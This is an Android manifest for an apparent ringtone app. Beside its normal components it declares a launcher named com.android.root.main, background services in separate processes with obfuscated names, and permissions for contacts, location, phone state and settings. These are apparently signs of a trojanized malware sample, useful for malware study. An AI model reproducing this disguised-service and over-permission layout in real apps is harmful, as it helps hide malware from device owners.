<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.super.mp3ringtone">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="orientation" android:label="@string/app_name" android:name="net.lucky.star.mrtm.HomeActivity"/>
        <activity android:configChanges="orientation" android:name="net.lucky.star.mrtm.SearchActivity"/>
        <activity android:configChanges="orientation" android:name="net.lucky.star.mrtm.LibraryActivity"/>
        <service android:enabled="true" android:exported="false" android:icon="@drawable/icon" android:label="@string/app_name" android:name="net.lucky.star.mrtm.srv.DownloadService"/>
        <receiver android:enabled="true" android:exported="false" android:icon="@drawable/icon" android:label="@string/app_name" android:name="net.lucky.star.mrtm.srv.DownloadReceiver"/>
        <provider android:authorities="net.lucky.star.mrtm.mdd" android:icon="@drawable/icon" android:label="@string/app_name" android:name="net.lucky.star.mrtm.db.DownloadedProvider"/>
        <provider android:authorities="net.lucky.star.mrtm.mdq" android:icon="@drawable/icon" android:label="@string/app_name" android:name="net.lucky.star.mrtm.db.DownloadListProvider"/>
        <activity android:name="net.lucky.star.mrtm.editor.RingtoneSelectActivity">
            <intent-filter>
                <action android:name="android.intent.action.GET_CONTENT"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.OPENABLE"/>
                <data android:mimeType="audio/*"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name="net.lucky.star.mrtm.editor.RingtoneEditActivity">
            <intent-filter android:label="@string/edit_intent">
                <action android:name="android.intent.action.EDIT"/>
                <data android:mimeType="audio/*"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name="dE$nJ"/>
        <activity android:name="com.millennialmedia.android.MMAdViewOverlayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.millennialmedia.android.VideoPlayer" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:name="com.android.root.main">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name="com.android.root.Setting" android:process=":remote"/>
        <service android:name="bG$hG" android:process=":remote2"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
</manifest>